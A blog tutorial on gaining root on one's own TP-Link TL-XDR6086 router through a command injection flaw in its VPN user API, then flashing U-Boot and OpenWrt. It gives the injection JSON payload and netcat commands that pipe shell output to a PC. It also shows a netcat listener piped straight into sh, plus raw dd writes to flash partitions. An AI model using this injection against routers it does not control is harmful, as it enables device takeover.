---
title: "Flashing OpenWrt onto the TP-Link TL-XDR6086 via Shell Injection"
description: "Exploiting a command injection vulnerability in the TL-XDR6086 admin API to gain root access and flash OpenWrt firmware."
pubDate: "Aug 29 2024"
tags:
  - Router
  - OpenWrt
  - Security
updatedDate: "Mar 03 2026"
heroImageId: "3c7ff10d-721c-4a50-bdbd-e2a2afc91200"
heroImageOwned: true
---

I wanted a compact Wi-Fi router that could handle real workloads — specifically, one capable of running OpenWrt with a global transparent proxy. After some research, I settled on these requirements:

1. **OpenWrt support**: OpenWrt's package ecosystem is unmatched for things like transparent proxying and custom routing rules.
2. **Internal antennas**: Cleaner setup, less desk clutter.
3. **2.5 Gbps WAN port**: Future-proofing for high-speed uplinks.
4. **A capable CPU**: Necessary to run OpenWrt without choking on 2.5 Gbps throughput.

The TP-Link TL-XDR6086 checked every box, and it appeared in the [OpenWrt device table](https://openwrt.org/toh/tp-link/xdr-6086) — so I bought one.

## Before You Start

Replacing your router's firmware is not a supported operation. Think of it like rooting an Android phone: you're deliberately circumventing manufacturer restrictions, usually by exploiting a vulnerability. **This will void your warranty**, and there is a real risk of bricking the device.

> **If your router dies following these steps, that's on you. It works on my machine.**

A few ground rules:

- **Use the [OpenWrt Wiki](https://openwrt.org/toh/tp-link/xdr-6086)** as your primary reference — not Baidu, not AI, not random forums, not this post alone.
- Pre-built packages are available at the [OpenWrt package mirror](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/). No need to compile from source for most things.
- **This guide assumes you're comfortable with a Linux (or macOS/FreeBSD) terminal.** If you're on Windows, sort that out first.

## The Vulnerability: Command Injection in the VPN User API

The exploit targets the router's admin HTTP API. When creating a VPN user via `POST /stok=${STOK}/ds`, the `username` field is passed unsanitized to a shell command on the router. This is a classic **command injection** vulnerability.

> To get your `STOK` token: log into the admin panel, open DevTools (F12), and inspect the network requests. You'll find it in the request URLs.

### Injection payload

```json
{
  "vpn": {
    "table": "user",
    "para": {
      "username": "; YOUR_COMMAND_HERE &",
      "password": "password1",
      "type": "l2tp",
      "netmode": "client2lan",
      "localip": "192.168.2.1",
      "dns": "1.1.1.1",
      "block": "0",
      "ippool": "new",
      "maxsessions": "1"
    },
    "name": "user_1"
  },
  "method": "add"
}
```

The injected command is stored in the router's database and **executed when you delete the VPN user**. For example, to run `echo 'hello'`, set `username` to `;echo 'hello'&`.

## Flashing OpenWrt

### Step 1: Prepare a USB Drive

Format a USB drive as FAT32. Download `netcat` from the [OpenWrt package mirror](https://downloads.openwrt.org/releases/21.02-SNAPSHOT/packages/aarch64_cortex-a53/packages/) and save it to the drive as `netcat.ipk`.

> **Why not TFTP?** The Chinese OpenWrt community commonly recommends setting up a TFTP server on your PC, but that's unnecessarily complex. A USB drive sidesteps the whole setup. The TFTP approach is popular because people tend to copy solutions without fully understanding them.

### Step 2: Mount the USB Drive and Establish a Reverse Shell

Inject the following command to create a mount point:

```sh
mkdir /tmp/usb
```

On your PC, start listening with netcat:

```sh
nc -l -p 4444
```

> **What's a reverse shell?** Instead of connecting _to_ the router, the router connects _out to you_. You listen on your PC; the router pipes its shell output through `nc` to your machine. This bypasses firewall rules that block inbound connections.

Verify the injection worked — replace `192.168.1.100` with your PC's IP:

```sh
ls -la /tmp | nc 192.168.1.100 4444
```

If you see directory output on your PC, the injection is working. Now mount the USB drive:

```sh
mount -t vfat /dev/sda1 /tmp/usb
```

> **Note on device naming:** Every time you unplug and replug the USB drive, the device node increments (`sda1` → `sda2` → `sda3`). It resets to `sda1` after a router reboot. Use `ls /dev | nc 192.168.1.100 4444` to confirm the current device name before mounting.

Verify the mount:

```sh
ls -la /tmp/usb | nc 192.168.1.100 4444
```

Install netcat from the USB drive:

```sh
opkg install /tmp/usb/netcat.ipk
```

With netcat installed natively, you now have a proper interactive reverse shell:

```sh
netcat -lp 4444 | sh
```

### Step 3: Backup the Original Firmware

Before touching anything, back up the current flash partition. You'll be grateful for this if anything goes wrong.

```sh
dd if=/dev/mtdblock9 of=/tmp/usb/backup.img bs=131072
```

### Step 4: Flash U-Boot

> ⚠️ **This is the most dangerous step. A failed write here can permanently brick the router. Understand what you're doing before proceeding.**

You'll need the U-Boot binaries for this device. You can compile them from [hanwckf's bl-mt798x source](https://github.com/hanwckf/bl-mt798x) (referenced in [this issue](https://github.com/hanwckf/immortalwrt-mt798x/issues/207)), or download pre-built binaries from a trusted source.

Flash in strict order — **bl2 first, then fip**:

```sh
dd bs=131072 conv=sync of=/dev/mtdblock9 if=/tmp/usb/xdr608x-bl2.bin
dd bs=131072 conv=sync of=/dev/mtdblock9 seek=28 if=/tmp/usb/xdr608x-fip.bin
```

> Append `2>&1 | nc 192.168.1.100 4444` to capture any errors from the second command.

**Do not run the second command if the first fails.**

### Step 5: Boot into U-Boot and Flash OpenWrt

Set your PC's IP to `192.168.1.100/24` with a default gateway of `192.168.1.1`.

Power-cycle the router. If U-Boot flashed correctly, the LED will blink red. Navigate to `http://192.168.1.1` — you should see the U-Boot web UI.

![U-Boot web UI](https://imagedelivery.net/6gszw1iux5BH0bnwjXECTQ/5d6eb200-ac42-4b02-c09b-f689ec194d00/public)

Upload your OpenWrt firmware image through the UI.

> **Firmware compatibility note:** As of the original writing (August 2024), the XDR-6086 lacks full upstream OpenWrt support. Finding a compatible image took some digging. I eventually found a working build on [恩山论坛 (En Shan Forum)](https://www.right.com.cn/forum/), a Chinese router enthusiast community. Search there if the official releases don't support this device yet.
